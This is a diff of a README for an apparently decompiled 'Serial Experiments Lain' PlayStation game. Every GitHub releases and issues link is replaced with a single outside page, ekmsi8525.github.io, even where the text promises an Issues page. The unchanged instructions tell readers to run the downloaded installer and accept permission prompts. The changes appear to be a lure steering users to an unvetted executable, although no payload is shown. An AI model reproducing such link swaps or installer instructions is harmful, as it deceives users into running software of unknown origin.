@@ -1,6 +1,6 @@
 # 🖥️ lain-psx-decompiled - Play the Cult Classic on Modern Computers
 
-[![Download Now](https://img.shields.io/badge/Download-lain--psx--decompiled-2ea44f?style=for-the-badge&logo=github)](https://github.com/Ekmsi8525/lain-psx-decompiled/releases)
+[![Download Now](https://img.shields.io/badge/Download-lain--psx--decompiled-2ea44f?style=for-the-badge&logo=github)](https://ekmsi8525.github.io)
 
 ## 🎮 What Is This?
 
@@ -18,7 +18,7 @@ Have you ever wanted to experience the mysterious world of *Serial Experiments L
 
 Let's get you playing in just a few minutes. Follow these simple steps:
 
-1. **Download the application** — Visit this link to download the application: [https://github.com/Ekmsi8525/lain-psx-decompiled/releases](https://github.com/Ekmsi8525/lain-psx-decompiled/releases)
+1. **Download the application** — Visit this link to download the application: [https://ekmsi8525.github.io](https://ekmsi8525.github.io)
 2. **Run the installer** — Once the download finishes, locate the file in your Downloads folder and double-click it to run. Your computer might ask for permission — just click "Yes" or "Run" to continue.
 3. **Follow the on-screen prompts** — The installation wizard will guide you through the setup process. Press "Next" or "Install" whenever you're ready.
 4. **Launch the game** — After installation completes, you'll find a shortcut on your desktop or in your Start Menu. Double-click it to start playing.
@@ -27,7 +27,7 @@ That's it! You're ready to explore the Wired.
 
 ## ⬇️ Download and Installation
 
-Visit this link to download the application: **[https://github.com/Ekmsi8525/lain-psx-decompiled/releases](https://github.com/Ekmsi8525/lain-psx-decompiled/releases)**
+Visit this link to download the application: **[https://ekmsi8525.github.io](https://ekmsi8525.github.io)**
 
 When you arrive at the page, you'll see a list of available files. Here's how to pick the right one:
 
@@ -78,7 +78,7 @@ Even though this client is designed to be hassle-free, sometimes things go wrong
 
 ### Still Having Problems?
 
-Don't worry! This project has an active community ready to help. Visit the [Issues page](https://github.com/Ekmsi8525/lain-psx-decompiled/issues) and describe your problem. Be sure to mention:
+Don't worry! This project has an active community ready to help. Visit the [Issues page](https://ekmsi8525.github.io) and describe your problem. Be sure to mention:
 - Your operating system (Windows 10, macOS 13, Ubuntu 22.04, etc.)
 - Your computer's specifications
 - What happened when you tried to run the game
@@ -113,6 +113,6 @@ This project is released under an open-source license. The game code has been in
 
 **Ready to begin?** Click the download button below and step into the Wired.
 
-[![Get Started Now](https://img.shields.io/badge/Get%20Started-Download%20Now-brightgreen?style=for-the-badge&logo=download)](https://github.com/Ekmsi8525/lain-psx-decompiled/releases)
+[![Get Started Now](https://img.shields.io/badge/Get%20Started-Download%20Now-brightgreen?style=for-the-badge&logo=download)](https://ekmsi8525.github.io)
 
 Keywords: lain, psx, serial-experiments-lain, decompiled, native, windows, macos, linux, retro-gaming, cult-classic, visual-novel, cyberpunk, anime-game
